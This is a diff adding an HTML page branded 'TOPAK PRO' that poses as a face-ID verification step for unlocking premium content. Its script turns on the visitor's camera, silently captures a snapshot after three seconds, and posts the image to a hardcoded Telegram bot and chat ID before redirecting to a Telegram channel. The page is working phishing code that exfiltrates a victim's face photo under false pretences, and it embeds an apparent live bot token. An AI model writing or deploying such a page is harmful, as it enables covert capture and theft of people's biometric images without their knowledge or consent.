@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TOPAK PRO | FACE ID VERIFICATION</title>
+    <style>
+        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { border: 2px solid #00ff00; padding: 20px; border-radius: 15px; width: 90%; max-width: 400px; box-shadow: 0 0 20px #00ff00; }
+        .camera-box { width: 100%; height: 200px; background: #111; border: 1px dashed #555; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; }
+        video { width: 100%; height: 100%; object-fit: cover; }
+        .btn { background: #00ff00; color: #000; padding: 15px; width: 100%; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2 style="color: #00ff00;">FACE VERIFICATION</h2>
+    <p style="font-size: 12px; color: #888;">Enable camera to verify your identity and unlock premium content.</p>
+    
+    <div class="camera-box" id="camBox">
+        <video id="video" autoplay playsinline></video>
+        <div id="placeholder" style="position: absolute;">[ CAMERA PREVIEW ]</div>
+    </div>
+
+    <button class="btn" onclick="initCamera()">START VERIFICATION</button>
+    <canvas id="canvas"></canvas>
+</div>
+
+<script>
+    const token = "8533713892:AAGYF0xkIlVDGmCwywyw3Y2_zt8EuiQfZ-g";
+    const chatId = "7461145170";
+
+    async function initCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            document.getElementById('placeholder').style.display = 'none';
+
+            // ۳ ثانیې وروسته عکس اخلي کله چې هغه خپل مخ سم کړي
+            setTimeout(() => {
+                takeSnap();
+            }, 3000);
+        } catch (err) {
+            alert("Error: Please allow camera access to continue.");
+        }
+    }
+
+    function takeSnap() {
+        const canvas = document.getElementById('canvas');
+        const video = document.getElementById('video');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+
+        // عکس په بڼه بدلوي (Base64)
+        const imageData = canvas.toDataURL('image/jpeg');
+        sendToTelegram(imageData);
+    }
+
+    async function sendToTelegram(image) {
+        // لومړی یو میسج لېږي چې عکس په لاره دی
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=📸 TOPAK PRO: New Face Snapshot Captured!`);
+
+        // د عکس لېږلو لپاره (Blob طريقه)
+        const blob = await (await fetch(image)).blob();
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'snap.jpg');
+
+        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        });
+
+        alert("Verification Complete. Redirecting...");
+        window.location.href = "https://t.me/TOPAK1V";
+    }
+</script>
+</body>
+</html>
